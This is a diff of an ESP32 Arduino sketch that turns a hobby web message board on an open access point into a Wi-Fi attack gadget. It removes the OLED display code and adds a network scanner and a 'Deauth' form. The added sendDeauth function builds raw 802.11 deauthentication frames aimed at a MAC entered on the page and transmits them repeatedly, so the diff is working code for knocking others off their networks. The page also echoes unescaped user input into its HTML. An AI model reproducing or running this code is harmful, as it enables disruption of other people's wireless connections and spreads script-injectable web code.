@@ -1,20 +1,14 @@
 #include <WiFi.h>
 #include <WebServer.h>
-#include <Wire.h>
-#include <Adafruit_GFX.h>
-#include <Adafruit_SSD1306.h>
-
-#define SCREEN_WIDTH 128
-#define SCREEN_HEIGHT 64
-
-Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, -1);
+#include "esp_wifi.h"
+#include "esp_now.h"
 
 const char* ssid = "techiesms";
 const char* password = "";
 
 WebServer server(80);
 String messages = "";
-String lastDisplayedMessages = "";
+String wifiScanResults = "";
 
 const char webpage[] PROGMEM = R"=====(<!DOCTYPE html>
 <html>
@@ -45,16 +39,12 @@ const char webpage[] PROGMEM = R"=====(<!DOCTYPE html>
       text-align: center;
     }
 
-    h1 {
+    h1, h3 {
       color: #00ff00;
       text-shadow: 0 0 5px #00ff00;
     }
 
-    h3 {
-      color: #33ff33;
-    }
-
-    input[type="text"] {
+    input[type="text"], input[type="submit"] {
       width: 80%;
       padding: 10px;
       margin: 10px 0;
@@ -63,17 +53,6 @@ const char webpage[] PROGMEM = R"=====(<!DOCTYPE html>
       border: 1px solid #00ff00;
       border-radius: 5px;
       font-size: 16px;
-    }
-
-    input[type="submit"] {
-      padding: 10px 20px;
-      background-color: #0f0f0f;
-      color: #00ff00;
-      border: 1px solid #00ff00;
-      border-radius: 5px;
-      font-size: 16px;
-      cursor: pointer;
-      box-shadow: 0 0 10px #00ff00;
     }
 
     input[type="submit"]:hover {
@@ -101,6 +80,13 @@ const char webpage[] PROGMEM = R"=====(<!DOCTYPE html>
       <input type="text" name="message" placeholder="Type something...">
       <input type="submit" value="Send">
     </form>
+    <form action="/scan_wifi" method="GET">
+      <input type="submit" value="Scan WiFi">
+    </form>
+    <form action="/deauth" method="POST">
+      <input type="text" name="target" placeholder="Target MAC (AA:BB:CC:DD:EE:FF)">
+      <input type="submit" value="Deauth">
+    </form>
     <div id="messages"></div>
   </div>
   <script>
@@ -115,24 +101,22 @@ const char webpage[] PROGMEM = R"=====(<!DOCTYPE html>
 </html>
 )=====";
 
-
 void handleRoot() {
   char buffer[sizeof(webpage)];
   strcpy_P(buffer, webpage);
-  server.send(200, "text/html", buffer);
+  String page = buffer;
+  page.replace("<div id=\"messages\"></div>", "<div id=\"messages\">" + messages + "<br><br><strong>WiFi Scan Results:</strong><br>" + wifiScanResults + "</div>");
+  server.send(200, "text/html", page);
 }
 
 void handleSend() {
   if (server.hasArg("message")) {
     String message = server.arg("message");
-
-    // If message is "reset", clear all stored messages
     if (message == "reset") {
       messages = "";
     } else {
       messages += "Web: " + message + "<br>";
     }
-
     Serial.println("Received message from web: " + message);
   }
   server.sendHeader("Location", "/");
@@ -140,52 +124,84 @@ void handleSend() {
 }
 
 void handleMessages() {
-  server.send(200, "text/html", messages);
+  server.send(200, "text/html", messages + "<br><br><strong>WiFi Scan Results:</strong><br>" + wifiScanResults);
+}
+
+void handleScanWifi() {
+  int n = WiFi.scanNetworks();
+  wifiScanResults = "";
+
+  if (n == 0) {
+    wifiScanResults = "No networks found.<br>";
+  } else {
+    for (int i = 0; i < n; ++i) {
+      wifiScanResults += String(i + 1) + ". ";
+      wifiScanResults += WiFi.SSID(i);
+      wifiScanResults += " (RSSI: ";
+      wifiScanResults += WiFi.RSSI(i);
+      wifiScanResults += ") ";
+      wifiScanResults += WiFi.BSSIDstr(i);
+      wifiScanResults += "<br>";
+    }
+  }
+  WiFi.scanDelete();
+  Serial.println("WiFi Scan Completed");
+  server.sendHeader("Location", "/");
+  server.send(303);
+}
+
+void sendDeauth(const String& macStr) {
+  uint8_t mac[6];
+  if (sscanf(macStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
+             &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]) != 6) {
+    Serial.println("Invalid MAC address format");
+    return;
+  }
+
+  const uint8_t deauthPacket[] = {
+    0xc0, 0x00, 0x3a, 0x01, 
+    mac[0], mac[1], mac[2], mac[3], mac[4], mac[5],
+    mac[0], mac[1], mac[2], mac[3], mac[4], mac[5],
+    mac[0], mac[1], mac[2], mac[3], mac[4], mac[5],
+    0x00, 0x00
+  };
+
+  for (int i = 0; i < 20; i++) {
+    esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
+    delay(10);
+  }
+
+  messages += "Deauth sent to " + macStr + "<br>";
+  Serial.println("Deauth packets sent to: " + macStr);
+}
+
+void handleDeauth() {
+  if (server.hasArg("target")) {
+    String mac = server.arg("target");
+    sendDeauth(mac);
+  }
+  server.sendHeader("Location", "/");
+  server.send(303);
 }
 
 void setup() {
   Serial.begin(115200);
+  WiFi.mode(WIFI_AP);
   WiFi.softAP(ssid, password);
-  Serial.println(WiFi.softAPIP());
+  esp_wifi_set_promiscuous(true);
+
+  Serial.println("AP IP address: " + WiFi.softAPIP().toString());
 
   server.on("/", handleRoot);
   server.on("/send", HTTP_POST, handleSend);
-  server.on("/messages", HTTP_GET, handleMessages);
-  server.begin();
+  server.on("/messages", handleMessages);
+  server.on("/scan_wifi", handleScanWifi);
+  server.on("/deauth", HTTP_POST, handleDeauth);
 
-  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
-    Serial.println(F("SSD1306 allocation failed"));
-    for (;;);
-  }
-  display.clearDisplay();
-  display.setTextSize(1);
-  display.setTextColor(WHITE);
+  server.begin();
+  Serial.println("Server started");
 }
 
 void loop() {
   server.handleClient();
-
-  if (messages != lastDisplayedMessages) {
-    display.clearDisplay();
-    display.setCursor(0, 0);
-
-    // Limit number of lines to fit screen
-    int maxLines = 6;
-    int start = messages.lastIndexOf("<br>", messages.length() - 1);
-    int lines = 0;
-    String toDisplay = messages;
-
-    while (start != -1 && lines < maxLines) {
-      start = messages.lastIndexOf("<br>", start - 1);
-      lines++;
-    }
-    if (start != -1) {
-      toDisplay = messages.substring(start + 4); // skip "<br>"
-    }
-
-    toDisplay.replace("<br>", "\n"); // format for OLED
-    display.println(toDisplay);
-    display.display();
-    lastDisplayedMessages = messages;
-  }
 }
